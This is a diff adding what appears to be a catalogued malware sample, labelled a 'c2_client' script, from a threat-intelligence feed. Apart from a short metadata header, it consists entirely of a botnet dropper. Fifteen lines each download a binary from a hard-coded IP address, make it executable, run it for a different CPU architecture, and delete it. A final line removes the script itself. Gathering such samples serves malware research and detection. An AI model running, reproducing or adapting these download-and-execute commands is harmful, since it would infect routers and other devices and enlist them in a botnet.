@@ -1,0 +1,26 @@
+# sha256: 2779ac942a1c5d8f07f6eec7d4707d1bf2583760029573da7fd23210084fa405
+# family: c2_client
+# kind: script
+# size_bytes: 1399
+# first_seen: 2026-09-09 01:41:21.284000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+wget http://160.250.181.124/k7m2q9xa/q4m8az; chmod 777 q4m8az; ./q4m8az arm4; rm -rf q4m8az
+wget http://160.250.181.124/k7m2q9xa/r71kxp; chmod 777 r71kxp; ./r71kxp arm5; rm -rf r71kxp
+wget http://160.250.181.124/k7m2q9xa/s29vbc; chmod 777 s29vbc; ./s29vbc arm6; rm -rf s29vbc
+wget http://160.250.181.124/k7m2q9xa/t6n3wy; chmod 777 t6n3wy; ./t6n3wy arm7; rm -rf t6n3wy
+wget http://160.250.181.124/k7m2q9xa/u84jzf; chmod 777 u84jzf; ./u84jzf m68k; rm -rf u84jzf
+wget http://160.250.181.124/k7m2q9xa/v5x92k; chmod 777 v5x92k; ./v5x92k mips; rm -rf v5x92k
+wget http://160.250.181.124/k7m2q9xa/w31qhp; chmod 777 w31qhp; ./w31qhp mipsel; rm -rf w31qhp
+wget http://160.250.181.124/k7m2q9xa/x7c46m; chmod 777 x7c46m; ./x7c46m ppc; rm -rf x7c46m
+wget http://160.250.181.124/k7m2q9xa/y52ndq; chmod 777 y52ndq; ./y52ndq sh4; rm -rf y52ndq
+wget http://160.250.181.124/k7m2q9xa/z8r17b; chmod 777 z8r17b; ./z8r17b spc; rm -rf z8r17b
+wget http://160.250.181.124/k7m2q9xa/n4p82s; chmod 777 n4p82s; ./n4p82s x86_64; rm -rf n4p82s
+wget http://160.250.181.124/k7m2q9xa/q4m7xz; chmod 777 q4m7xz; ./q4m7xz i486; rm -rf q4m7xz
+wget http://160.250.181.124/k7m2q9xa/b8t2kp; chmod 777 b8t2kp; ./b8t2kp arc; rm -rf b8t2kp
+wget http://160.250.181.124/k7m2q9xa/n5c9rw; chmod 777 n5c9rw; ./n5c9rw aarch64; rm -rf n5c9rw
+wget http://160.250.181.124/k7m2q9xa/v3k8qp; chmod 777 v3k8qp; ./v3k8qp mipsrouter; rm -rf v3k8qp
+
+rm -f $0
